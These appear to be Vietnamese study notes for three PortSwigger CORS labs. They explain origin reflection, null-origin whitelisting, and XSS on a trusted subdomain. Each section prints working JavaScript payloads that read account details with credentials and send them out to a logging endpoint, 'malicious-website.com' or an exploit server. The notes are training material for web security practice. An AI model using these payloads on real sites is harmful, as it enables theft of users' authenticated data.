# CORS

### 1. CORS vulnerability with basic origin reflection
https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack

Context: trusted all origin

![alt text](image.png)

Trong response có `Access-Control-Allow-Credentials: True` nó cho phép mang cookie hoặc authorization client có khi truy cập từ orgin khác. 

Test:

Thêm `Origin: https://example.com` vào request và ở response xuất hiện `Access-Control-Allow-Origin: https://example.com`

![alt text](image-1.png)

```js
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

hoặc 
```js
<html>
    <body>
        <script>
            var xhr = new XMLHttpRequest();
            var url = "Lab-id"

            xhr.onreadystatechange = function() {
                if (xhr.readyState == XMLHttpRequest.DONE) {
                    fetch("/log?key=" + xhr.responseText)
                }
            }

            xhr.open('GET', url + "/accountDetails", true);
            xhr.withCredentials = true;
            xhr.send(null)
        </script>
    </body>
</html>
```

--- 

### 2. CORS vulnerability with trusted null origin
https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack

Nếu whitelist của trusted origin có `null` thì dẫn đến việc nó có thể dẫn đến CORS do browser sẽ gửi giá trị `null` trong origin trong 1 số trường hợp như: 
- Cross-origin redirects.
- Requests từ serialized data.
- Request sử dụng `file:` protocol.
- request cross-origin được gửi từ Sandboxed.

Payload: 
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```

---

XSS WITH CORS

Khi CORS cho phép 1 orgin, nhưng origin đó có thể tấn công XSS thì từ origin đó có thể thực thi JS CORS qua trang chính mà không bị chặn. 

---

### 3. CORS vulnerability with trusted insecure protocols
https://portswigger.net/web-security/cors/lab-breaking-https-attack

Context: ở đây subdomain `stock.domain chính` bị XSS từ đây ta có payload: 

```html
<script>
    document.location="http://stock.0a41007504014d858586c60500f000c4.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a41007504014d858586c60500f000c4.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a2e0093048b4d188569c55301ea0032.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

Ta chú ý: xuất phát từ `stock.` là trang bị XSS nhưng CORS cho phép, dùng JS để truy cập trang web cần lấy và rồi gửi thông tin về server attacker, rõ ràng trang web bị XSS nhưng vẫn nằm trang danh sách CORS này là trung gian.

Có 1 điểm đặc biệt nghiêm trọng trong CORS là `Access-Control-Allow-Credentials: true` vì khi có header này tức là khi ta request đến trang đó, nó sẽ cho phép lấy các authorization hoặc cookie mà client đã truy cập trước đó để request, thì sẽ tự động vào phiên của người dùng trước đó, còn nếu không có thì dù có truy cập được nhưng vẫn chỉ là trang web chung, vì ko có tính cá nhân victim trong đó. 


 
